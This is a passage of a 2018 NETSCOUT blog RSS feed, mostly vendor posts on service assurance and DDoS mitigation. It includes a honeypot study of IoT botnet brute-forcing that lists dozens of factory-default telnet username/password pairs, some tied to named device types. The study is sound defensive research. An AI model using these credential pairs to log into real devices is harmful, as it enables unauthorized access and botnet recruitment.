<p>NETSCOUT’s service assurance solution for virtualization helped this African mobile operator accelerate their move to NFV and Cloud infrastructure with confidence that they would maintain service levels. While virtualization was a major disruption to their network NETSCOUT’s solution did not disrupt their Network Operations and Engineering teams. vSCOUT and vSTREAM delivered smart data to meet the needs of this mobile operator for service assurance, business analytics and security assurance with software optimized for the cloud. And finally,&nbsp;NETSCOUT’S&nbsp;future ready solution&nbsp;reduced&nbsp;their service assurance budget CAPEX by&nbsp;2/3 and OPEX by&nbsp;1/3.</p>

<p>To learn more visit the<a href="https://www.netscout.com/nfv-smarter-video/?ls=PR-MKTG&amp;lsd=blog-110518-3"> NETSCOUT NVF Smarter page</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/africa_mobile_blog.jpg" length="348952" type="image/jpeg"/>
    <guid isPermaLink="false">fdd7d19d-e721-4eb0-8e24-a4f621555a6b</guid>
    <pubDate>Mon, 05 Nov 2018 09:52:46 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>Customer Profile: Xtel Communications</title>
  <link>http://localhost:7996/blog/customer-profile-xtel-communications</link>
  <description>With Arbor Sightline and Arbor Threat Mitigation System in Xtel’s environment, the network operation center is able to respond to events swiftly.</description>
  <content:encoded><![CDATA[<p>For fifteen years, Xtel Communications, Inc. has provided fiber optic networking, Cloud and Voice services throughout the northeast United States, to businesses, schools and governments. Providing the highest level of service reliability is paramount for Xtel’s commitment to high customer satisfaction and excellent quality of service.</p>

<p>As a part of their business continuity plan, Xtel made the decision to transition their infrastructure to the cloud. Xtel assessed the potential complexities of an open hybrid infrastructure and were determined to find a security solution that offered both DDoS protection and visibility into current and future threats.</p>

<p>The lack of visibility into network traffic and the inability to provide protection against distributed denial of service (DDoS) attacks were becoming a significant challenge for Xtel’s network team.</p>

<p>“A team of Tier 2 engineer were responsible for proactively monitoring and addressing network alerts at our NOC. However, the legacy IPS IDS systems we had in place constricted us [XTEL] with capacity limitations.” said Harbinder Goraya, director of engineering, Xtel Communications.</p>

<p>Previously, Xtel had a legacy IDS (Intrusion Detection System) and IPS (Intrusion Prevention System) running at the edge. Those devices were able to provide basic DDoS protection capabilities. As bandwidth demands increased, DDoS attacks became more common as did service and performance issues. It was clear that a purpose-built and proven DDoS mitigation solution was required.</p>

<p>Xtel began its search with a list of specific requirements to address their business goals. They required a solution that could be used to protect their own infrastructure and deliver a best in class solution for their customers as well.</p>

<p>They were looking for a multi-tenant portal so customers could see alerts; utilize in-line or out-of-band deployment options; auto mitigation templates based on various countermeasures and mitigation scalability to 80 Gbps. What Xtel found in NETSCOUT® Arbor was the very team that helped create the DDoS managed services market, who for the past decade has enabled more than 70 service providers to deliver DDoS services to their customers.</p>

<p>NETSCOUT Arbor was able to deliver a customized solution that was aligned to Xtel’s business goals. </p>

<p>“We did our research and NETSCOUT Arbor’s reputation and footprint in the market were the key motivators for us to take a closer look. We knew we needed both a DDoS and a visibility solution. NETSCOUT Arbor customized a solution that fulfilled all of our stated requirements.” said Harbinder Goraya, Director of Engineering, Xtel Communications.</p>

<p><strong>Solution in Action</strong></p>

<p><a href="https://www.netscout.com/product/arbor-sightline/?ls=PR-MKTG&amp;lsd=blog-103018-1">NETSCOUT Arbor Sightline</a> provides comprehensive network visibility and reporting capabilities to help Xtel detect and understand availability threats, improve traffic engineering, peering relationships and service performance. Arbor SP also serves as a platform for managed DDoS protection services – which Xtel offers to its customers.</p>

<p>Arbor Sightline scales on physical and virtual instances to provide comprehensive DDoS detection across an entire service provider network, from the customer edge to the peering edge to the data center edge (or cloud edge) to the mobile edge, including the backbone network in-between. With this unparalleled visibility, Arbor Sightline’s workflows enable quick effective mitigation of any DDoS attack via NETSCOUT Arbor Threat Mitigation System.</p>

<p>Arbor Threat Mitigation System provides a full suite of countermeasures that surgically removes up to 400Gbps of DDoS attack traffic while enabling the flow of legitimate traffic – all without interrupting network services. Proven effective for detecting and removing threats such as high-volume flood attacks, stealthy application layer attacks and attacks hidden in SSL packets, Arbor Threat Mitigation System safeguards IPv4 and IPv6 infrastructure from distributed denial of service attacks. Automated and proven, Arbor Threat Mitigation System works to keep networks and services up 24 hours a day, seven days a week, 365 days a year.</p>

<p>Arbor Threat Mitigation System also simplifies and streamlines operations by providing the ability to view and manage up to eight terabits of mitigation capacity from a single point of control. This provides the ability to thwart multiple, large-scale attacks and produce comprehensive reports that summarize the mitigation process for customers and/or management.</p>

<p><img alt="Xtel Customer Profile" data-entity-type="file" data-entity-uuid="915a19c4-c8f2-465a-8fd5-094da30c54df" src="http://localhost:7996/sites/default/files/inline-images/xtel%20image%202.JPG" /></p>

<p><strong>The Results </strong></p>

<p>With Arbor Sightline and Arbor Threat Mitigation System in Xtel’ s environment, the network operation center is able to respond to events in less time with greater precision. Targeted attacks are effectively mitigated, relieving Xtel of expensive engineering resources and reducing time to mitigation. For Xtel’s customers, this translates into the high-quality service experience they have come to expect. Xtel is now protecting both its infrastructure and its customers with a suite of proven, world-class DDoS mitigation products from NETSCOUT Arbor.</p>

<p>Since the deployment of Arbor Sightline and Arbor Threat Mitigation System, Xtel’s business continues to grow rapidly. “Adding Arbor’s DDoS mitigation to Xtel’s Internet service offerings has significantly differentiated our service from our competitors’, allowing for more customers and higher satisfaction rates” said Brian Flynn, President, Xtel Communications. Xtel now provides services to more than 500 school districts in the northeastern United States and continues to grow market share with governments and businesses.</p>

<p>For more information, visit <a href="https://www.netscout.com/solutions/ddos-network-visibility">NETSCOUT’s Arbor Network Visibility and DDoS Managed Services</a> page on our site.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/xtel%20main%20image%201.jpg" length="626567" type="image/jpeg"/>
    <guid isPermaLink="false">5948d790-12e1-48cb-a589-9fba90e9d7d0</guid>
    <pubDate>Tue, 30 Oct 2018 10:00:00 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Jamal Bethea</dc:creator>
    </item>
<item>
  <title>Reinventing MNO Service Assurance: From Solution to Strategy</title>
  <link>http://localhost:7996/blog/reinventing-mno-service-assurance</link>
  <description>As many MNOs have discovered, building an intelligent network architecture is a critical success factor to DX-driven business strategies. And to get there, it’s time to build a modern service assurance strategy capable of supporting this key business asset.</description>
  <content:encoded><![CDATA[<p>The way we use phones to communicate has changed drastically&nbsp;over the past&nbsp;twenty&nbsp;years,&nbsp;evolving&nbsp;from&nbsp;sporadic&nbsp;mobile&nbsp;device&nbsp;usage&nbsp;to a&nbsp;world&nbsp;driven by&nbsp;ubiquitous mobile access.&nbsp;To keep up,&nbsp;mobile network operators&nbsp;(MNOs)&nbsp;must&nbsp;affect&nbsp;similarly drastic changes&nbsp;to build the kind of agile mobile network necessary to meet&nbsp;today’s&nbsp;user expectations.&nbsp;Such digital transformation&nbsp;(DX)&nbsp;poses&nbsp;a complex challenge, and according to a recent&nbsp;<a href="https://www.netscout.com/industry-technology-spotlight">IDC Technology Spotlight</a>&nbsp;report,&nbsp;success lies in how well MNOs can reinvent their service assurance strategy to meet this brave new world.&nbsp;</p>

<p>According to the report,&nbsp;well over half of MNOs have implemented DX&nbsp;projects in 2018, with an emphasis on improving customer experience&nbsp;and business&nbsp;efficiency, as well as&nbsp;delivering&nbsp;better service offerings.&nbsp;</p>

<p>To get there, however, MNOs need to figure out how to&nbsp;navigate a tricky path.&nbsp;Globally, MNOs are racing to adopt some important new technologies:&nbsp;</p>

<ul>
	<li data-aria-level="1" data-aria-posinset="1" data-font="Symbol" data-leveltext="" data-listid="1"><a href="https://www.netscout.com/sites/default/files/2018-08/SPWP_011_EN-1801-5G-Makes-Virtualization-Vital-Not-Optional.pdf">Preparing for the 5G era</a></li>
	<li data-aria-level="1" data-aria-posinset="1" data-font="Symbol" data-leveltext="" data-listid="1"><a href="https://www.netscout.com/nfv-smarter-video?ls=PR-MKTG&amp;lsd=blog-102918-1">Network&nbsp;Functions&nbsp;Virtualization (NFV)</a></li>
	<li data-aria-level="1" data-aria-posinset="2" data-font="Symbol" data-leveltext="" data-listid="1">Network automation</li>
	<li data-aria-level="1" data-aria-posinset="3" data-font="Symbol" data-leveltext="" data-listid="1">Multi-cloud&nbsp;architecture</li>
	<li data-aria-level="1" data-aria-posinset="4" data-font="Symbol" data-leveltext="" data-listid="1">Internet of Things (IoT)&nbsp;</li>
	<li data-aria-level="1" data-aria-posinset="5" data-font="Symbol" data-leveltext="" data-listid="1">Mobile data management</li>
</ul>

<p>While&nbsp;those&nbsp;technological trends&nbsp;are vital to the success of&nbsp;DX strategies, they&nbsp;will&nbsp;also&nbsp;significantly impact&nbsp;the way&nbsp;MNOs manage&nbsp;network infrastructure.&nbsp;As the report notes, “The widespread move to virtualized and cloud technologies across IT and cellular, alongside the impending onslaught of new applications and new network-connected IoT devices, is leading to more dependence on the mobile network while displacing some of its traditional elements.”&nbsp;In particular, MNOs face a couple of key pain points:&nbsp;</p>

<ul>
	<li><strong>Old-school m</strong><strong>onitoring in a next-gen mobile network.</strong>Most traditional performance monitoring cannot&nbsp;see inside virtualized networks, while the proliferation of cloud deployments adds another visibility challenge. Network managers&nbsp;cannot continue to&nbsp;use&nbsp;stand-alone solutions that do not integrate easily, leaving them with fragmented views of their mobile network&nbsp;that directly correspond to inconsistent management&nbsp;and&nbsp;slow&nbsp;response time.&nbsp;</li>
	<li><strong>Taming the network data deluge.</strong>Agile service assurance depends on the ability to&nbsp;find, transform, and analyze relevant&nbsp;information from the data generated in a typical mobile network, a task rendered increasingly difficult&nbsp;by the explosion of network data&nbsp;from&nbsp;applications, devices, subscribers, and&nbsp;the&nbsp;network&nbsp;itself.&nbsp;Mobile edge computing, network slicing,&nbsp;and new&nbsp;IoT-driven projects will only increase the problem.&nbsp;</li>
</ul>

<p><strong>Modern Service Assurance</strong><br />
To solve these challenges, MNOs need to transform the way they&nbsp;<a href="https://www.netscout.com/shared/nfv-smarter-video/assets/White_Paper2_PDF.pdf">implement service assurance</a>&nbsp;to create&nbsp;end-to-end visibility&nbsp;across hybrid networks&nbsp;at the&nbsp;network, application, user, and&nbsp;device levels.&nbsp;IDC supports several&nbsp;key&nbsp;tactics,&nbsp;ranging from&nbsp;strategic to technical shifts.&nbsp;The following&nbsp;are particularly&nbsp;important:&nbsp;</p>

<ol>
	<li><strong>Switch to software.</strong>A shift to a pure software solution with a lower total cost of ownership will put network operations and the speedy, agile operations of the connected technology resources more visibly into the path of value creation.&nbsp;</li>
	<li><strong>Implement intelligent analytics.</strong>To tame the data deluge,&nbsp;companies should&nbsp;<a href="https://www.netscout.com/service-providers-using-smart-data">explore automation</a>&nbsp;that can access, collect, and transform relevant data at the source&nbsp;(for both north-south and east-west directions)&nbsp;to create&nbsp;smart data.&nbsp;</li>
	<li><strong>Educate stakeholders.</strong>&nbsp;CIOs and CTOs need to find a way to help&nbsp;business-side decision makers&nbsp;understand&nbsp;the business importance&nbsp;of integrated, end-to-end&nbsp;visibility&nbsp;when it comes to smooth operations and delivery of customer services.&nbsp;</li>
	<li><strong>Build service assurance into the strategy.</strong>In order for&nbsp;service assurance&nbsp;to&nbsp;work across&nbsp;an&nbsp;increasing hybrid mobile network landscape, it must be built into early planning stages of&nbsp;new network initiatives.&nbsp;</li>
</ol>

<p>As many MNOs have discovered,&nbsp;building an intelligent network architecture is a critical success factor to DX-driven business strategies.&nbsp;And to get there, it’s time to build a modern service assurance strategy&nbsp;capable of supporting this key business asset.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/102918%20mobile%20phone.jpg" length="299039" type="image/jpeg"/>
    <guid isPermaLink="false">97a5b517-2ef2-4888-b881-537f76449e17</guid>
    <pubDate>Mon, 29 Oct 2018 21:00:00 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>Election Security: Making Sure Information is Accurate and Available</title>
  <link>http://localhost:7996/blog/election-security-making-sure-information-accurate-and-available</link>
  <description>Failing to take these challenges seriously risks ceding the narrative of accurate information to adversaries. Once that narrative is lost, it can be very hard to recover.</description>
  <content:encoded><![CDATA[<p>Information Operations are designed to achieve military or diplomatic objectives through means other than the force of arms.&nbsp;The goal is often to influence the adversary's will and control the narrative.&nbsp;Targets can include military combatants, as well as civilians.</p>

<p>Today, most people are focused only on misinformation, but the denial of true information can be as dangerous as the prevalence of false information.&nbsp;</p>

<p>Mark Twain said, "a&nbsp;lie can travel halfway around the world before the truth can get its boots on." Elections officials need to be thinking about the&nbsp;<em>availability of accurate information&nbsp;</em>as much as how to deal with&nbsp;<em>false information</em>.&nbsp;</p>

<p>In the cybersecurity realm, DDoS is the weapon of choice for denying information availability.&nbsp;<a href="https://www.netscout.com/threatreport/?ls=PR-MKTG&amp;lsd=blog-102418-1">NETSCOUT saw about 2.8 million attacks in the first half of 2018 and attack peak sizes have skyrocketed to the terabit-level</a>. DDoS attacks have never been more innovative, dynamic, or consequential, and there could be even more dangerous DDoS attacks on the horizon.</p>

<p>For candidates, getting your message out to voters is critical to your campaign. Having no information reach voters is almost as bad as having false information reach them.&nbsp;For example, several DDoS attacks took down a congressional candidate’s website during this year’s California primary election. The most damaging was timed to coincide with a candidates’ debate, to prevent interested voters from visiting the candidate’s website to learn more.&nbsp;<a href="https://www.rollingstone.com/politics/politics-news/california-congressional-race-hack-745519/">Now it seems like the FBI is investigating the incident</a>, which certainly raises the stakes.</p>

<p>Similarly, elections officials, including Secretaries of State and County Registrars, must work to ensure timely and accurate election information reaches the public. This includes securing websites and any associated infrastructure and critical nodes in the supply chain.&nbsp;<a href="https://www.cyberscoop.com/election-security-offerings-list/">Several vendors, including NETSCOUT, are offering free services this elections cycle to assist with this effort.</a>&nbsp;</p>

<p>Failing to take these <a href="https://www.netscout.com/news/blog/cybersecurity-and-elections/?ls=PR-MKTG&amp;lsd=blog-102418-2">challenges</a> seriously risks ceding the narrative of accurate information to adversaries. Once that narrative is lost, it can be very hard to recover.&nbsp;</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/voting%20102418.jpg" length="613723" type="image/jpeg"/>
    <guid isPermaLink="false">3fdc2b16-34ac-4b6c-b8f4-fc260b3ed482</guid>
    <pubDate>Wed, 24 Oct 2018 15:15:00 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Mike McNerney</dc:creator>
    </item>
<item>
  <title>Dipping Into The Honeypot</title>
  <link>http://localhost:7996/blog/asert/dipping-honeypot</link>
  <description>Brute-forcing factory default usernames and passwords remains a winning strategy for Internet of Things (IOT) botnet propagation.</description>
  <content:encoded><![CDATA[<h2>Executive Summary</h2>

<p>Brute-forcing factory default usernames and passwords remains a winning strategy for Internet of Things (IOT) botnet propagation. Botnet operators with the best list will produce the larger botnet and obtain superior firepower for launching DDoS attacks. IOT bots are indiscriminate – they will randomly choose an address to attack and work through their list of usernames and passwords until either giving up or infecting the targeted device. For the month of September we observed 1,065 unique username and password combinations from 129 different countries. Taking a step back and looking at malware-agnostic regional trends for username and password combinations, local affinities for different types of IOT devices emerge.</p>

<p>&nbsp;</p>

<h2>Key Findings</h2>

<ul>
	<li>Interrogating botnets revealed 1,005 additional username and password combinations beyond Mirai's default list, of the 1,065 total observed.</li>
	<li>Combinations used across disparate regions surface trends regarding device type deployments.</li>
	<li>Attacks from bots using specific manufacturer default passwords are often perpetrated from similarly compromised devices.</li>
</ul>

<h2>Details</h2>

<p>The infamous IOT malware, Mirai, first burst on to the scene in late 2016, resulting in a <a href="https://asert.arbornetworks.com/omg-mirai-minions-are-wicked">number of variants</a> emerging since, but much of their success belong to a simple propagation method – default usernames and passwords. Several variants evolved to use exploits that targeted vulnerabilities, but a mundane factory-installed username and password is still incredibly effective. Mirai bundled its own list of usernames and passwords, which made its way into the publicly released source code. This code allowed anyone with a modicum of technical skill to build their own IOT botnet. Fast adopters quickly crowded the landscape and IOT bots became commonplace. Some found that by using their own custom list of username and passwords, they could achieve evolutionary success by infecting devices that others could not. Collecting the usernames and passwords used by IOT malware is a fertile field for analysis. By emulating enough of the telnet protocol to elicit usernames and passwords (and more!), bots will gladly share their hit list to anyone listening. With enough of these collectors, trends emerge. Let’s focus on data collected during the month of September 2018. The top 5 username and password combos (<strong>Figure 1</strong>) won’t surprise anyone:</p>

<p>&nbsp;</p>

<p><span style="font-family: monospace;">admin/admin </span></p>

<p><span style="font-family: monospace;">guest/12345 </span></p>

<p><span style="font-family: monospace;">root/vizxv </span></p>

<p><span style="font-family: monospace;">root/xc3511 </span></p>

<p><span style="font-family: monospace;">support/support</span></p>

<p><strong>Figure 1: Top 5 Username/Passwords, September 2018</strong> These password combos came with the original Mirai source code, including two – <span style="font-family: monospace;">vizxv</span> and <span style="font-family: monospace;">xc3511</span> – that target the DVRs that propelled the original Mirai bot to prominence. The usernames and passwords that <em>don’t</em> appear in the original Mirai source code are the more interesting.</p>

<p><strong>Figure 2</strong> shows a list of frequently used combinations:</p>

<p><span style="font-family: monospace;">default/default </span></p>

<p><span style="font-family: monospace;">root/1001chin </span></p>

<p><span style="font-family: monospace;">root/ </span></p>

<p><span style="font-family: monospace;">telnetadmin/telnetadmin </span></p>

<p><span style="font-family: monospace;">root/ttnet </span></p>

<p><span style="font-family: monospace;">root/taZz@23495859 </span></p>

<p><span style="font-family: monospace;">root/aquario </span></p>

<p><span style="font-family: monospace;">e8telnet/e8telnet </span></p>

<p><span style="font-family: monospace;">admin/ </span></p>

<p><span style="font-family: monospace;">telnet/telnet </span></p>

<p><span style="font-family: monospace;">e8ehome/e8ehome </span></p>

<p><span style="font-family: monospace;">root/cat1029 </span></p>

<p><span style="font-family: monospace;">root/5up </span></p>

<p><span style="font-family: monospace;">root/ivdev </span></p>

<p><span style="font-family: monospace;">admin/aquario </span></p>

<p><span style="font-family: monospace;">root/zsun1188 </span></p>

<p><span style="font-family: monospace;">default/antslq </span></p>

<p><span style="font-family: monospace;">root/founder88 </span></p>

<p><span style="font-family: monospace;">admin/ipcam_rt5350 </span></p>

<p><span style="font-family: monospace;">default/</span></p>

<p><strong>Figure 2: Top 20 Username/Passwords not in original Mirai, September 2018</strong> The list includes a mix of both basic, <span style="font-family: monospace;">default/default</span> and <span style="font-family: monospace;">root/</span>, and specific, <span style="font-family: monospace;">root/1001chin</span> and <span style="font-family: monospace;">root/taZz@23495859</span>, username and password combinations. The more specific passwords refer to factory defaults for certain devices. In the past two years attackers focused on adding new devices to their war chest.</p>

<p><strong>Figure 3</strong> shows a map of telnet brute-forcers, the top countries being Russia, China, Brazil, US, and South Korea, respectively. What can we tell about the usernames and passwords used by bots based on their geography? <a href="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/10/honeypot_map.png"><img alt="" class="size-full wp-image-9627 aligncenter" height="493" src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/10/honeypot_map.png" width="974" /></a> <strong>Figure 3: Map of bot infections, September 2018</strong> When an automated bot like Mirai attempts an unsolicited brute-force attack, chances are the device rattling the doorknob is susceptible to the exact same attack. In fact, it’s possible the device attempting the brute-force is already a part of the botnet via the same attack, perhaps even the same username and password combination. Some devices appear more prominent in certain countries, due to either availability or popularity. Let’s take a look at several of these anomalies (<strong>Figure 4</strong>).</p>

<table style="height: 875px;" width="642">
	<tbody>
		<tr>
			<td width="102"><strong>Country</strong></td>
			<td width="269"><strong>Username/Password</strong></td>
			<td width="136"><strong>Local Rank</strong></td>
			<td width="114"><strong>Overall Rank</strong></td>
		</tr>
		<tr>
			<td width="102">Russia</td>
			<td width="269"><span style="font-family: monospace;">root/20080826</span></td>
			<td width="136">7</td>
			<td width="114">91</td>
		</tr>
		<tr>
			<td width="102">Russia</td>
			<td width="269"><span style="font-family: monospace;">vstarcam2015/20150602</span></td>
			<td width="136">10</td>
			<td width="114">105</td>
		</tr>
		<tr>
			<td width="102">China</td>
			<td width="269"><span style="font-family: monospace;">telecomadmin/admintelecom</span></td>
			<td width="136">1</td>
			<td width="114">9</td>
		</tr>
		<tr>
			<td width="102">China</td>
			<td width="269"><span style="font-family: monospace;">telnetadmin/telnetadmin</span></td>
			<td width="136">2</td>
			<td width="114">13</td>
		</tr>
		<tr>
			<td width="102">China</td>
			<td width="269"><span style="font-family: monospace;">e8ehome/e8ehome</span></td>
			<td width="136">10</td>
			<td width="114">37</td>
		</tr>
		<tr>
			<td width="102">Brazil</td>
			<td width="269"><span style="font-family: monospace;">root/aquario</span></td>
			<td width="136">2</td>
			<td width="114">23</td>
		</tr>
		<tr>
			<td width="102">Vietnam</td>
			<td width="269"><span style="font-family: monospace;">root/20080826</span></td>
			<td width="136">8</td>
			<td width="114">91</td>
		</tr>
		<tr>
			<td width="102">Indonesia</td>
			<td width="269"><span style="font-family: monospace;">Administrator/admin</span></td>
			<td width="136">5</td>
			<td width="114">92</td>
		</tr>
		<tr>
			<td width="102">Iran</td>
			<td width="269"><span style="font-family: monospace;">admin1/password</span></td>
			<td width="136">5</td>
			<td width="114">84</td>
		</tr>
		<tr>
			<td width="102">Iran</td>
			<td width="269"><span style="font-family: monospace;">mother/fucker</span></td>
			<td width="136">6</td>
			<td width="114">88</td>
		</tr>
		<tr>
			<td width="102">Iran</td>
			<td width="269"><span style="font-family: monospace;">admin/54321</span></td>
			<td width="136">7</td>
			<td width="114">75</td>
		</tr>
		<tr>
			<td width="102">Iran</td>
			<td width="269"><span style="font-family: monospace;">root/12345</span></td>
			<td width="136">8</td>
			<td width="114">35</td>
		</tr>
		<tr>
			<td width="102">Iran</td>
			<td width="269"><span style="font-family: monospace;">admin/meinsm</span></td>
			<td width="136">9</td>
			<td width="114">68</td>
		</tr>
		<tr>
			<td width="102">Canada</td>
			<td width="269"><span style="font-family: monospace;">root/xmhdipc</span></td>
			<td width="136">9</td>
			<td width="114">30</td>
		</tr>
		<tr>
			<td width="102">Nigeria</td>
			<td width="269"><span style="font-family: monospace;">telecomadmin/admintelecom</span></td>
			<td width="136">1</td>
			<td width="114">9</td>
		</tr>
	</tbody>
</table>

<p><strong>Figure 4: Username/Passwords by country, local &amp; overall rank, September 2018</strong></p>

<p>The <span style="font-family: monospace;">root/20080826</span> combination seen primarily from Russia appears to be for a device called TM02 TripMate – a travel router.&nbsp; Likewise, <span style="font-family: monospace;">vstarcam2015/20150602</span> appears to be the magic incantation to grant access to a webcam. Both devices are available in the United States, but perhaps more popular in Russia. It’s unlikely to be targeted scanning and not the behavior of a bot, since the sources are well distributed. The data in <strong>Figure 4</strong> was filtered out for noise, such as a single IP in Italy brute-forcing the internet for days with <span style="font-family: monospace;">&lt;blank&gt;/&lt;blank&gt;</span>. Other cases are clearer, such as <span style="font-family: monospace;">telecomadmin/admintelecom</span> for Huawei devices, which have a much larger install base outside of western countries. The fifth through the ninth top username and passwords combinations from Iran are also strange. They’re not uncommon passwords, not necessarily for a specific device, but are far more prevalent from Iran. Maybe an older bot that remains in play?</p>

<h2>Summary</h2>

<p>IOT bots employ the shotgun approach to propagation – pick a target at random and keep trying until the list is exhausted, or the attack is successful. Until the attackers take a more nuanced approach, security researchers can identify their targets through the use of honeypots. Although not an exact science, the study of IOT botnet behavior can help us understand targeting and methodology employed by botnet operators. Breaking down these trends both globally and regionally show an IOT ecosystem rife for abuse.</p>

<p>&nbsp;</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/honeypot-1024x683-768x344.jpg" length="74562" type="image/jpeg"/>
    <guid isPermaLink="false">3a96bbd1-9b96-4a26-9014-d28e431615a3</guid>
    <pubDate>Tue, 23 Oct 2018 08:59:43 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Five Things to Know About NETSCOUT Arbor Edge Defense</title>
  <link>http://localhost:7996/blog/five-things-know-about-netscout-arbor-edge-defense</link>
  <description>NETSCOUT AED redefines the cyber security stack to serve as the first and last line of defense against multiple types of inbound and outbound threats. Learn more about AED and what it can do for your network.</description>
  <content:encoded><![CDATA[<p><a href="https://www.netscout.com/products/arbor-edge-defense">NETSCOUT AED</a> occupies a unique position on the network edge, lying outside the firewall, between the enterprise and the internet. Why is this important? Read on for five ways that AED redefines the cyber security stack to serve as the first and last line of defense against multiple types of inbound and outbound threats.</p>

<ol><li><strong>AED is built for a new era of internet-scale threats. </strong>As the architecture of enterprise networks changes, so too do the increasingly sophisticated and persistent techniques of attackers. “Data center and network architectures have distributed toward the edge, straining traditional perimeter enforcement points,” said Jeff Wilson, IHS Markit research director for cybersecurity .</li>
</ol><p>Today’s campaigns target a wide variety of sources for a wide variety of reasons, from increasing geopolitical unrest to intellectual property theft. Attackers often use supply chains as a conduit, a tactic that allows them to attack their main target via the intertwined relationships of partners and suppliers.</p>

<p>Threat actors continue to expand and weaponize their capabilities, as traditional malware adds worm modules, allowing the malicious software to spread faster and more easily. One example is “NotPetya” where threat actors planted a backdoor in a popular Ukrainian accounting software package. The malware initially targeted the Ukraine, where more than 80 businesses were affected. It quickly proliferated across France, Germany, Italy, Poland, the United Kingdom, Russia, and the United States.</p>

<p>These attacks caused serious commercial damage around the world, forcing global organizations such as Federal Express, shipping giant Maersk and consumer products giant Mondelez to miss earnings and lose out on hundreds of millions in lost revenue.</p>

<p>AED is built to combat such internet-scale intrusions. “The unique combination of stateless filtering, rigorous curation of custom threat intelligence as well as ingestion of third-party feeds, allows NESTCOUT AED to block outbound threats with the same level of confidence they’ve been blocking inbound DDoS threats for years,”<strong> continued IHS’ Wilson. </strong></p>

<ol start="2"><li><strong>AED extends protection beyond the firewall</strong>. Traditional perimeter security devices such as Next-gen firewalls, Intrusion Prevention Solutions, and load balancers are susceptible to botnet driven state-exhaustion attacks. In fact, NETSCOUT’s <a href="https://www.netscout.com/report/">13th Annual Worldwide Infrastructure Security Report (WISR)</a> found that 52 percent of enterprise respondents had firewalls that experienced a failure or contributed to an outage during a DDoS attack.</li>
</ol><p><img alt="AED WISR" data-entity-type="file" data-entity-uuid="38d913a5-70d5-4a4d-a9cf-fb250d6c17dd" src="http://localhost:7996/sites/default/files/inline-images/image001.png" /></p>

<p>AED is deployed in front of these solutions, protecting them from DDoS attacks that target their availability. NETSCOUT’s stateless packet processing engine detects and mitigates most DDoS attacks without tracking any session state. In cases where tracking is required, AED only stores minimal information for a short period of time. As a result, AED can withstand targeted attacks that overwhelm state tables in these other security products and threaten availability.</p>

<ol start="3"><li><strong>AED blocks inbound and outbound threats.</strong> In addition to protecting perimeter solutions from availability-based threats such as DDoS attacks, AED adds a layer of enforcement by blocking communications to known suspicious destinations. Operationalizing these reputation lists, commonly referred to as Indicators of Compromise (IoCs), are best used by stateless devices due to the speed and scale.</li>
</ol><p>Detecting and disrupting Command &amp; Control communications at the edge requires stateless packet process at internet scale. AED is a purpose-built device designed to keep pace with attackers as they evolve their tradecraft, reducing the performance load of expecting stateful devices to perform functions that are outside of their primary purpose. </p>

<ol start="4"><li><strong>Automated threat mitigation</strong>. AED is enhanced by threat intelligence via the ATLAS Intelligence Feed (AIF). Developed by NETSCOUT’s ATLAS Security Engineering &amp; Response Team ( <a href="http://cts.businesswire.com/ct/CT?id=smartlink&amp;url=https%3A%2F%2Fasert.arbornetworks.com%2F&amp;esheet=51872193&amp;newsitemid=20180926005463&amp;lan=en-US&amp;anchor=ASERT&amp;index=4&amp;md5=485cf69f62bb6e67c414dca96c52323b">ASERT</a>), AIF includes geo-location data and automates the identification of attacks from known botnets and malware while ensuring that updates for new threats are automatically delivered without intrusive software upgrades.</li>
</ol><p>Extending this enforcement, AED supports standards such as STIX/TAXII for ingestion of third-party threat intelligence. It also provides a robust REST API to integrate threat detection and blocking telemetry into existing Security Operations workflows and management tools.</p>

<ol start="5"><li><strong>AED provides actionable threat intelligence</strong>. NETSCOUT believes that effective threat intelligence not only identifies attacks, but also provides context to understand and catalogue attack infrastructure, methods, and related indicators to help security professionals make faster, more confident security decisions. Contextual intelligence not only links IoCs to known threats, but also current data that correlates seemingly unconnected in-bound/out-bound communications to expose targeted campaigns. Armed with this data, security professionals can see the bigger picture, giving them a much better chance of quickly linking in-bound malicious traffic with outbound communications. Such threat intelligence is critical for quickly detecting interrelated components of orchestrated, botnet-driven attack campaigns. It also helps them quickly find and disrupt attacks before they do real damage.</li>
</ol><p>To learn more about the new era of internet-scale attacks, read <a href="https://www.netscout.com/threatreport-flipbook">NETSCOUT’s Threat Intelligence Report</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/shutterstock_1181662462.jpg" length="301106" type="image/jpeg"/>
    <guid isPermaLink="false">38b2b336-7dc7-4602-bbad-8a94afe8ae94</guid>
    <pubDate>Mon, 22 Oct 2018 16:00:00 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Service Assurance Evolves for Hybrid Networks</title>
  <link>http://localhost:7996/blog/service-assurance-evolves-hybrid-networks</link>
  <description>To deliver service agility in today's hybrid networking environment, a new level of service assurance must be included in network design principles.</description>
  <content:encoded><![CDATA[<p>By&nbsp;Stephanie Gibbons, Principal Analyst, Network Infrastructure&nbsp;and&nbsp;Software, Ovum Consulting</p>

